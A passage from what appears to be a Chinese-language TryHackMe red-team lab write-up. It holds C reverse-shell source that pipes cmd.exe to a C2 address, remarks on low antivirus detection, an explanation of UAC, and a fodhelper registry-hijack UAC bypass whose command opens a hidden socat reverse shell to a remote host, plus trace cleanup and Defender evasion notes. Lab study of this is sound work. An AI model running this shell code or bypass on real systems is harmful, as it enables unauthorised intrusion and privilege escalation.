<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (</span><span style="color: #61AFEF">myWSAConnect</span><span style="color: #ABB2BF">(mySocket, (SOCKADDR </span><span style="color: #C678DD">*</span><span style="color: #ABB2BF">)</span><span style="color: #C678DD">&amp;</span><span style="color: #ABB2BF">addr, </span><span style="color: #C678DD">sizeof</span><span style="color: #ABB2BF">(addr), </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">) </span><span style="color: #C678DD">==</span><span style="color: #ABB2BF"> SOCKET_ERROR)</span></span>
<span class="line"><span style="color: #ABB2BF">	{</span></span>
<span class="line"><span style="color: #ABB2BF">		</span><span style="color: #61AFEF">myclosesocket</span><span style="color: #ABB2BF">(mySocket);</span></span>
<span class="line"><span style="color: #ABB2BF">		</span><span style="color: #61AFEF">myWSACleanup</span><span style="color: #ABB2BF">();</span></span>
<span class="line"><span style="color: #ABB2BF">	}</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #C678DD">else</span></span>
<span class="line"><span style="color: #ABB2BF">	{</span></span>
<span class="line"><span style="color: #ABB2BF">		</span><span style="color: #61AFEF">printf</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;Connected to </span><span style="color: #D19A66">%s</span><span style="color: #98C379">:</span><span style="color: #D19A66">%d</span><span style="color: #56B6C2">\\</span><span style="color: #98C379">n&quot;</span><span style="color: #ABB2BF">, C2Server, C2Port);</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">		</span><span style="color: #C678DD">char</span><span style="color: #ABB2BF"> Process</span><span style="color: #C678DD">[]</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;cmd.exe&quot;</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #ABB2BF">		STARTUPINFO sinfo;</span></span>
<span class="line"><span style="color: #ABB2BF">		PROCESS_INFORMATION pinfo;</span></span>
<span class="line"><span style="color: #ABB2BF">		</span><span style="color: #61AFEF">memset</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">&amp;</span><span style="color: #ABB2BF">sinfo, </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, </span><span style="color: #C678DD">sizeof</span><span style="color: #ABB2BF">(sinfo));</span></span>
<span class="line"><span style="color: #ABB2BF">		</span><span style="color: #E5C07B">sinfo</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">cb</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">sizeof</span><span style="color: #ABB2BF">(sinfo);</span></span>
<span class="line"><span style="color: #ABB2BF">		</span><span style="color: #E5C07B">sinfo</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">dwFlags</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> (STARTF_USESTDHANDLES </span><span style="color: #C678DD">|</span><span style="color: #ABB2BF"> STARTF_USESHOWWINDOW);</span></span>
<span class="line"><span style="color: #ABB2BF">		</span><span style="color: #E5C07B">sinfo</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">hStdInput</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">sinfo</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">hStdOutput</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">sinfo</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">hStdError</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> (HANDLE)mySocket;</span></span>
<span class="line"><span style="color: #ABB2BF">		</span><span style="color: #61AFEF">CreateProcess</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">, Process, </span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">TRUE</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">, </span><span style="color: #C678DD">&amp;</span><span style="color: #ABB2BF">sinfo, </span><span style="color: #C678DD">&amp;</span><span style="color: #ABB2BF">pinfo);</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">		</span><span style="color: #61AFEF">printf</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;Process Created </span><span style="color: #D19A66">%lu</span><span style="color: #56B6C2">\\</span><span style="color: #98C379">n&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">pinfo</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">dwProcessId</span><span style="color: #ABB2BF">);</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">		</span><span style="color: #61AFEF">WaitForSingleObject</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">pinfo</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">hProcess</span><span style="color: #ABB2BF">, INFINITE);</span></span>
<span class="line"><span style="color: #ABB2BF">		</span><span style="color: #61AFEF">CloseHandle</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">pinfo</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">hProcess</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #ABB2BF">		</span><span style="color: #61AFEF">CloseHandle</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">pinfo</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">hThread</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #ABB2BF">	}</span></span>
<span class="line"><span style="color: #ABB2BF">}</span></span>
<span class="line"></span>
<span class="line"><span style="color: #C678DD">int</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">main</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">int</span><span style="color: #E06C75"> </span><span style="color: #E06C75; font-style: italic">argc</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #C678DD">char</span><span style="color: #E06C75"> </span><span style="color: #C678DD">**</span><span style="color: #E06C75; font-style: italic">argv</span><span style="color: #ABB2BF">)</span></span>
<span class="line"><span style="color: #ABB2BF">{</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (argc </span><span style="color: #C678DD">==</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">3</span><span style="color: #ABB2BF">)</span></span>
<span class="line"><span style="color: #ABB2BF">	{</span></span>
<span class="line"><span style="color: #ABB2BF">		</span><span style="color: #C678DD">int</span><span style="color: #ABB2BF"> port </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">atoi</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">argv</span><span style="color: #ABB2BF">[</span><span style="color: #D19A66">2</span><span style="color: #ABB2BF">]);</span></span>
<span class="line"><span style="color: #ABB2BF">		</span><span style="color: #61AFEF">RunShell</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">argv</span><span style="color: #ABB2BF">[</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">], port);</span></span>
<span class="line"><span style="color: #ABB2BF">	}</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #C678DD">else</span></span>
<span class="line"><span style="color: #ABB2BF">	{</span></span>
<span class="line"><span style="color: #ABB2BF">		</span><span style="color: #C678DD">char</span><span style="color: #ABB2BF"> host</span><span style="color: #C678DD">[]</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;10.2.2.106&quot;</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #ABB2BF">		</span><span style="color: #C678DD">int</span><span style="color: #ABB2BF"> port </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">4444</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #ABB2BF">		</span><span style="color: #61AFEF">RunShell</span><span style="color: #ABB2BF">(host, port);</span></span>
<span class="line"><span style="color: #ABB2BF">	}</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure>
<p>最后可以用 <code>strip</code> 跑一遍，丢到 VT 上扫一下，检出率很低</p>
<img src="/thm_rthe/image-20250827162448859.png" class="" title="image-20250827162448859">
<p>试想一下，如果用这种技术去造一个 Shellcode 加载器，用动态加载 + 函数名混淆 + shellcode 签名混淆 + 壳，过静态应该问题不大，容易检测的点都给他过了，要针对的就只是内存扫描了。</p>
<h1>Bypassing UAC 绕过 UAC</h1>
<p>之前在完成一些房间的时候接触到了老系统通过证书的 URL 来提权，这个房间详细介绍了现在可用的提权手段，是利用了 Windows 的 “feature”。</p>
<h2 id="UAC-的概念">UAC 的概念</h2>
<p>UAC 是一个 Windows 的安全特性，默认情况下强制任何新进程以非特权帐户的安全上下文运行。该策略适用于任何用户启动的进程，包括管理员本人。其理念是我们不能仅依赖用户的身份来判断某些操作是否应被授权。</p>
<p>UAC 并没有把管理员账户变成普通账户，而是改变了程序运行时的<strong>默认权限</strong>。</p>
<ul>
<li><strong>没有 UAC 的时代</strong>：只要你用管理员身份登录，你运行的任何程序都自动拥有管理员的全部权限。</li>
<li><strong>有了 UAC 之后</strong>：默认情况下，你启动的任何程序（包括由管理员本人启动的）都只被赋予<strong>非特权账户</strong>的权限。这意味着，它无法随意修改系统文件、注册表等关键区域。</li>
</ul>
<p>当一个程序需要执行一个可能影响系统的操作时（比如安装软件），UAC 会弹出一个权限确认窗口。只有当管理员**亲自点击“是”**来授权后，这个程序才能临时获得管理员权限，完成特定任务。</p>
<h3 id="Integrity-Levels-完整性级别">Integrity Levels 完整性级别</h3>
<p>UAC 是一种强制完整性控制（Mandatory Integrity Control (MIC)），它通过为用户、进程和资源中的每一项分配一个完整性级别（IL）来实现区分。一般来说，具有更高 IL 的用户或进程访问令牌将能够访问具有较低或相等 IL 的资源。MIC 优先于常规的 Windows DACL，因此即便根据 DACL 你被授权访问某个资源，如果你的 IL 不够高也无济于事。</p>
<table>
<thead>
<tr>
<th><strong>完整性级别</strong></th>
<th><strong>用途</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Low</td>
<td>通常用于与互联网交互（例如 Internet Explorer）。权限非常有限。</td>
</tr>
<tr>
<td>Medium</td>
<td>分配给标准用户和管理员的受限令牌。</td>
</tr>
<tr>
<td>High</td>
<td>在启用 UAC 时由管理员的提升令牌使用。如果 UAC 被禁用，所有管理员将始终使用高完整性级别（High IL）令牌。</td>
</tr>
<tr>
<td>System</td>
<td>预留给系统使用</td>
</tr>
</tbody>
</table>
<h4 id="Filtered-Tokens-受限令牌">Filtered Tokens 受限令牌</h4>
<p>为实现这种角色分离，UAC 在登录时以略有不同的方式对待普通用户和管理员：</p>
<ul>
<li>非管理员用户会在登录的时候收到一个访问令牌，该令牌将用于用户执行的所有任务。该令牌具有 Medium IL。</li>
<li>管理员用户会收到两个访问令牌
<ul>
<li>受限令牌：已被剥夺管理员权限的令牌，用于常规操作，该令牌具有 Medium IL。</li>
<li>提升令牌：一个拥有完全管理员权限的令牌，用于需要管理员权限运行的东西，该令牌具有 High IL。</li>
</ul>
</li>
</ul>
<p>总而言之，管理员在日常使用中会使用受限令牌，除非他们通过 UAC 请求提升权限。</p>
<h4 id="通过正常方式打开应用程序">通过正常方式打开应用程序</h4>
<p>图1是正常打开应用程序的 Token，图2是通过管理员权限打开的。可以看到左边的是 Medium IL，右边的是 High IL，拥有的权限也更多。</p>
<img src="/thm_rthe/605235aa87c2f39689d0396bb3603967.png" class="" title="img">
<h3 id="UAC-的设定">UAC 的设定</h3>
<p>UAC 可以配置为以下四种不同的通知级别：</p>
<ul>
<li><strong>始终通知</strong>： 当程序试图安装应用或对计算机进行更改时，以及你手动修改 Windows 设置时，UAC 都会弹出通知并要求授权。这是最严格、最安全的设置。</li>
<li><strong>仅在程序试图对我的计算机进行更改时通知</strong> (默认设置)： 当程序试图安装应用或对计算机进行更改时，UAC 会弹出通知并要求授权。但如果你是管理员，手动更改 Windows 设置（例如，更改日期和时间）则不会触发 UAC 提示。</li>
<li><strong>仅在程序试图对我的计算机进行更改时通知 (不调暗桌面)</strong>： 功能和上一个级别相同，但弹出 UAC 提示时不会调暗桌面。这会牺牲一部分安全性，因为恶意软件理论上有机会在提示窗口上模拟点击。</li>
<li><strong>从不通知</strong>： 禁用 UAC 提示。在这种模式下，管理员运行的所有程序都会默认获得最高权限，这与没有 UAC 时的行为相同。这是最不安全的设置，不推荐使用。</li>
</ul>
<h4 id="实际上只有两个档">实际上只有两个档</h4>
<p>然而在微软的 Raymond Chen（陈瑞孟）在 <a target="_blank" rel="noopener" href="https://devblogs.microsoft.com/oldnewthing/?p=94105">There are really only two effectively distinct settings for the UAC slider</a> 一文中说实际上只有两个档：</p>
<ul>
<li>始终通知</li>
<li>辣鸡</li>
</ul>
<p>src: <a target="_blank" rel="noopener" href="https://blog.walterlv.com/post/there-are-only-two-settings-for-the-uac-slider.html">https://blog.walterlv.com/post/there-are-only-two-settings-for-the-uac-slider.html</a></p>
<h3 id="UAC-内部原理">UAC 内部原理</h3>
<p>UAC 的核心，是应用程序信息服务（Application Information Service，或称 Appinfo）。每当用户需要提升权限时，会发生以下情况：</p>
<ol>
<li>用户请求以管理员身份运行应用程序。</li>
<li>使用 runas 语法调用 ShellExecute API。</li>
<li>请求被转发到 Appinfo 处理提升。</li>
<li>应用程序 manifest 会被检查，以确定是否允许自动提升（稍后详述）。</li>
<li>Appinfo 会执行 consent.exe，在安全桌面上显示 UAC 提示。安全桌面只是一个独立的桌面，它将进程与实际用户桌面上运行的进程隔离开来，以避免其他进程以任何方式篡改 UAC 提示。</li>
<li>如果用户同意以管理员身份运行应用程序，Appinfo 服务将使用用户的提升令牌执行请求。然后，Appinfo 将设置新进程的父进程 ID，使其指向请求提升的 shell。</li>
</ol>
<img src="/thm_rthe/fce906f0e438efa938753430e5d25afe.png" class="" title="img">
<h2 id="绕过-UAC">绕过 UAC</h2>
<p><strong>UAC 与权限的假象</strong></p>
<ol>
<li><strong>权限受限</strong>：即使攻击者通过管理员账户获得了远程 shell（例如 PowerShell），他们也无法直接执行 <code>net user /add</code> 等管理任务。这是因为 <strong>UAC</strong> 强制所有新进程（包括管理员自己的进程）以**中等完整性级别（Medium IL）**运行，这是一种权限受限的模式。</li>
<li><strong>受限令牌</strong>：<code>whoami /groups</code> 命令的输出显示，该会话正在使用一个<strong>受限令牌</strong>，这意味着它虽然属于 <code>Administrators</code> 组，但却没有执行管理任务的权限。</li>
<li><strong>目标：绕过 UAC</strong>：为了获得**高完整性级别（High IL）**的完全控制权限，攻击者必须绕过 UAC。</li>
</ol>
<hr>
<p><strong>微软对 UAC 的态度</strong></p>
<ol>
<li><strong>不是安全边界</strong>：微软并不将 UAC 视为一种安全边界，而是将其定位为一种<strong>方便管理员的提醒工具</strong>。它旨在防止用户在不知情的情况下运行高权限进程。</li>
<li><strong>非漏洞</strong>：由于 UAC 不是安全边界，微软认为任何绕过 UAC 的技术都不算作漏洞，因此很多已知的绕过方法至今仍未被修补。</li>
</ol>
<p><strong>UAC 绕过的通用方法</strong></p>
<ol>
<li><strong>利用高完整性级别进程</strong>：大多数 UAC 绕过技术都利用一个已经以高完整性级别运行的<strong>合法父进程</strong>，来执行攻击者的代码。</li>
<li><strong>权限继承</strong>：一个由高完整性级别父进程创建的新进程，会自动<strong>继承</strong>相同的完整性级别。攻击者正是利用这一点，在不触发 UAC 提示的情况下，获得一个高权限的 shell。</li>
</ol>
<p>攻击者的目标是利用操作系统自身的信任机制，通过一个合法的、高权限的父进程，来获得一个完全控制的 shell，从而实现 UAC 绕过。</p>
<h3 id="基于-GUI-的绕过">基于 GUI 的绕过</h3>
<h4 id="msconfig">msconfig</h4>
<p>通过运行 msconfig，可以在不触发 UAC 的情况下获得一个 High IL，然后可以在 Tools 选项卡里打开 cmd，这个新运行的 cmd 会继承 msconfig 同样的访问令牌，这样你就有了一个具有 High IL 的 cmd 了。</p>
<p>这是通过一个称为“自动提升”的功能实现的，该功能允许特定二进制文件在不需要用户交互的情况下提升权限。</p>
<h4 id="azman-msc">azman.msc</h4>
<p>同样是 Win + R 运行，这里打开之后找到菜单栏 -&gt; 帮助 -&gt; 在弹出窗口里面点击查看源码，然后会打开默认的 notepad 应用，然后在 notepad 里面打开文件的时候运行 cmd，这样你就有了一个具有 High IL 的 cmd 了。</p>
<img src="/thm_rthe/image-20250827174454143.png" class="" title="image-20250827174454143">
<h3 id="自动提权的进程">自动提权的进程</h3>
<p>之前提到某些可执行程序能在不需要用户交互的情况下自动提升到 High IL，这适用于控制面板的大部分功能以及 Windows 附带的一些可执行文件。</p>
<p>对于应用程序，自动提权需要满足一些要求：</p>
<ol>
<li>可执行文件必须由 Windows Publisher 签名</li>
<li>可执行文件必须包含在受信任的目录中，如 <code>%SystemRoot%/System32/</code> 或 <code>%ProgramFiles%/</code></li>
</ol>
<p>根据应用程序的类型，可能会有其他要求：</p>
<ul>
<li>可执行文件 (.exe) 必须在其清单中声明 autoElevate 元素。要检查文件的清单，我们可以使用 Sysinternals 套件提供的工具 <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/sigcheck">sigcheck</a>。如果我们检查 msconfig.exe 的 manifest，就会发现 autoElevate 属性：</li>
</ul>
<figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">C:\tools\&gt; sigcheck64.exe -m c:/windows/system32/msconfig.exe</span></span>
<span class="line"><span style="color: #abb2bf">...</span></span>
<span class="line"><span style="color: #abb2bf">&lt;asmv3:application&gt;</span></span>
<span class="line"><span style="color: #abb2bf">	&lt;asmv3:windowsSettings xmlns=&quot;http://schemas.microsoft.com/SMI/2005/WindowsSettings&quot;&gt;</span></span>
<span class="line"><span style="color: #abb2bf">		&lt;dpiAware&gt;true&lt;/dpiAware&gt;</span></span>
<span class="line"><span style="color: #abb2bf">		&lt;autoElevate&gt;true&lt;/autoElevate&gt;</span></span>
<span class="line"><span style="color: #abb2bf">	&lt;/asmv3:windowsSettings&gt;</span></span>
<span class="line"><span style="color: #abb2bf">&lt;/asmv3:application&gt;</span></span></code></pre></div></div></figure>
<ul>
<li>mmc.exe 将根据用户请求的 .msc 快速插件自动提升。Windows 附带的大多数 .msc 文件都会自动提升。</li>
<li>Windows 还保留了一个额外的可执行文件列表，这些可执行文件即使未在清单中请求，也会自动提升级别。该列表包括 pkgmgr.exe 和 spinstall.exe。</li>
<li>COM 对象也可以通过配置某些注册表键值来请求自动提升 (<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/com/the-com-elevation-moniker">https://docs.microsoft.com/en-us/windows/win32/com/the-com-elevation-moniker</a>)。</li>
</ul>
<h4 id="Fodhelper">Fodhelper</h4>
<p>Fodhelper.exe 是 Windows 的一个默认可执行文件，负责管理 Windows 可选功能，包括额外语言、未默认安装的应用程序或其他操作系统特性。fodhelper 在使用默认 UAC 设置时可以自动提升权限，但与 msconfig 不同，fodhelper 可以在不访问 GUI 的情况下被滥用。</p>
<p>从攻击者的角度来看，这意味着它可以通过中等完整性远程 shell 使用，并提升为完全功能的高完整性进程。这个特定技术由 <a target="_blank" rel="noopener" href="https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/">@winscripting</a> 发现，并曾被 Glupteba 恶意软件在野使用。</p>
<p>fodhelper 会在注册表中搜索一个键，通过 Process Monitor 可以看到：</p>
<img src="/thm_rthe/eb7ac876cd05f51495f9882fa00ef832.png" class="" title="img">
<p>当 Windows 打开一个文件时，它会检查注册表以确定应使用哪个应用程序。注册表为每种文件类型保存一个称为程序标识符（ProgID）的键，其中关联了相应的应用程序。比如你尝试打开一个 HTML 文件。系统会检查名为 HKEY_CLASSES_ROOT 的注册表部分，以便知道必须使用你首选的网页客户端来打开它。要使用的命令将在每个文件 ProgID 的 <code>shell/open/command</code> 子键下指定。以 “htmlfile” ProgID 为例：</p>
<img src="/thm_rthe/2428d786ec68d8731dc98b6598211eb9.png" class="" title="img">
<p>实际上，HKEY_CLASSES_ROOT 只是注册表中两条不同路径的合并视图：</p>
<table>
<thead>
<tr>
<th><strong>Path</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>HKEY_LOCAL_MACHINE\Software\Classes</td>
<td>系统范围文件关联</td>
</tr>
<tr>
<td>HKEY_CURRENT_USER\Software\Classes</td>
<td>活动用户的文件关联</td>
</tr>
</tbody>
</table>
<p>在检查 HKEY_CLASSES_ROOT 时，如果在 HKEY_CURRENT_USER（HKCU）下存在用户特定的关联项，则优先使用用户的。如果未配置用户特定的关联项，则会改为使用 HKEY_LOCAL_MACHINE（HKLM）下的全局关联项。</p>
<p>当 <code>fodhelper.exe</code> 运行时，它会尝试调用 <code>ms-settings:</code> 协议来打开一个设置页面。它会去注册表查找这个协议的默认处理程序，我们可以在当前用户的 HKCU 中为这个 ProgID 创建一个关联，就会覆盖掉系统的默认关联。因为 fodhelper 是自动提权的，所以它启动的任何子进程都将继承高完整性令牌。</p>
<h4 id="实践-4">实践</h4>
<p>这个房间给的主机已经埋了一个后门，我们用 nc 连进去：</p>
<figure class="shiki cmd"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">nc </span><span style="color: #D19A66">10.201.63.248</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">9999</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF"># 查看当前的 IL</span></span>
<span class="line"><span style="color: #ABB2BF">C:\</span><span style="color: #E06C75">Windows</span><span style="color: #ABB2BF">\</span><span style="color: #E06C75">system32</span><span style="color: #ABB2BF">&gt;</span><span style="color: #E06C75">whoami</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">groups</span><span style="color: #ABB2BF"> | find </span><span style="color: #98C379">&quot;Label&quot;</span></span>
<span class="line"><span style="color: #ABB2BF">Mandatory </span><span style="color: #E06C75">Label</span><span style="color: #ABB2BF">\</span><span style="color: #E06C75">Medium</span><span style="color: #ABB2BF"> Mandatory Level                        Label            </span><span style="color: #E06C75">S</span><span style="color: #D19A66">-1-16-8192</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF"># 指定要修改的注册表</span></span>
<span class="line"><span style="color: #C678DD">set </span><span style="color: #E06C75">REG_KEY</span><span style="color: #ABB2BF">=</span><span style="color: #E06C75">HKCU</span><span style="color: #ABB2BF">\</span><span style="color: #E06C75">Software</span><span style="color: #ABB2BF">\</span><span style="color: #E06C75">Classes</span><span style="color: #ABB2BF">\</span><span style="color: #E06C75">ms</span><span style="color: #ABB2BF">-</span><span style="color: #E06C75">settings</span><span style="color: #ABB2BF">\</span><span style="color: #E06C75">Shell</span><span style="color: #ABB2BF">\</span><span style="color: #E06C75">Open</span><span style="color: #ABB2BF">\</span><span style="color: #E06C75">command</span></span>
<span class="line"><span style="color: #ABB2BF"># 要执行的命令</span></span>
<span class="line"><span style="color: #C678DD">set </span><span style="color: #E06C75">CMD</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:10.11.141.2:4444 EXEC:cmd.exe,pipes&quot;</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF"># 禁用默认的执行委托</span></span>
<span class="line"><span style="color: #ABB2BF">reg </span><span style="color: #56B6C2">add</span><span style="color: #ABB2BF"> %REG_KEY% /</span><span style="color: #E06C75">v</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;DelegateExecute&quot;</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">d</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;&quot;</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">f</span></span>
<span class="line"><span style="color: #ABB2BF"># 新建一个键 内容是我们要执行的命令</span></span>
<span class="line"><span style="color: #ABB2BF">reg </span><span style="color: #56B6C2">add</span><span style="color: #ABB2BF"> %REG_KEY% /</span><span style="color: #E06C75">d</span><span style="color: #ABB2BF"> %CMD% /</span><span style="color: #E06C75">f</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF"># 执行 fodhelper 就拿到 High IL 的 Shell 了</span></span>
<span class="line"><span style="color: #ABB2BF">fodhelper.exe</span></span></code></pre></div></div></figure>
<p>实际上你通过观察注册表会发现，HKCU 下的 ms-settings 是没有任何东西的，但是 fodhelper.exe 会优先检索 HKCU 下的 <code>\Software\Classes\ms-settings\Shell\Open\command</code>。我们通过把他的执行命令改了，弹一个 shell 回我们的机器，因为他是用高权限执行的，所以拿到的也是 High IL。</p>
<img src="/thm_rthe/image-20250827183247541.png" class="" title="image-20250827183247541">
<p>如果你只修改 <code>command</code> 键，而不去动 <code>DelegateExecute</code>，你的攻击链就会<strong>失败</strong>。这是因为 <code>DelegateExecute</code> 的优先级更高。</p>
<p>Windows 在处理 <code>ms-settings</code> 协议时，遵循一个严格的优先级：</p>
<ol>
<li><strong>首先检查 <code>DelegateExecute</code></strong>：操作系统或 <code>fodhelper.exe</code> 进程会首先检查 <code>command</code> 键下是否存在 <code>DelegateExecute</code> 这个值。</li>
<li><strong>执行委托</strong>：如果 <code>DelegateExecute</code> 存在且包含有效数据，它就会<strong>立即</strong>将执行权委托给该值所指向的程序。此时，<code>command</code> 键下设置的任何命令都会被<strong>完全忽略</strong>，即使你填入了恶意代码，它也不会被执行。</li>
<li><strong>退回执行</strong>：只有当 <code>DelegateExecute</code> 不存在或其值为<strong>空字符串</strong>时，操作系统才会“退回”并执行 <code>command</code> 键下的命令。</li>
</ol>
<h5 id="清理痕迹">清理痕迹</h5>
<p>用这一行命令删掉我们在 HKCU 下写的注册表就行了，系统会回去调用 HKLM 的项。</p>
<figure class="shiki cmd"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">reg delete </span><span style="color: #E06C75">HKCU</span><span style="color: #ABB2BF">\</span><span style="color: #E06C75">Software</span><span style="color: #ABB2BF">\</span><span style="color: #E06C75">Classes</span><span style="color: #ABB2BF">\</span><span style="color: #E06C75">ms</span><span style="color: #ABB2BF">-</span><span style="color: #E06C75">settings</span><span style="color: #ABB2BF">\ /</span><span style="color: #E06C75">f</span></span></code></pre></div></div></figure>
<h5 id="绕过-WD">绕过 WD</h5>
<p>刚刚是在 WD 关掉的情况下操作的，所以问题不大，那如果 WD 打开的话，在插入  <code>HKCU\Software\Classes\ms-settings\Shell\Open\command</code> 的时候就会报毒了</p>
<figure class="shiki cmd"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">set </span><span style="color: #E06C75">REG_KEY</span><span style="color: #ABB2BF">=</span><span style="color: #E06C75">HKCU</span><span style="color: #ABB2BF">\</span><span style="color: #E06C75">Software</span><span style="color: #ABB2BF">\</span><span style="color: #E06C75">Classes</span><span style="color: #ABB2BF">\</span><span style="color: #E06C75">ms</span><span style="color: #ABB2BF">-</span><span style="color: #E06C75">settings</span><span style="color: #ABB2BF">\</span><span style="color: #E06C75">Shell</span><span style="color: #ABB2BF">\</span><span style="color: #E06C75">Open</span><span style="color: #ABB2BF">\</span><span style="color: #E06C75">command</span></span>
<span class="line"><span style="color: #C678DD">set </span><span style="color: #E06C75">CMD</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:10.11.141.2:4444 EXEC:cmd.exe,pipes&quot;</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">reg </span><span style="color: #56B6C2">add</span><span style="color: #ABB2BF"> %REG_KEY% /</span><span style="color: #E06C75">v</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;DelegateExecute&quot;</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">d</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;&quot;</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">f</span></span>
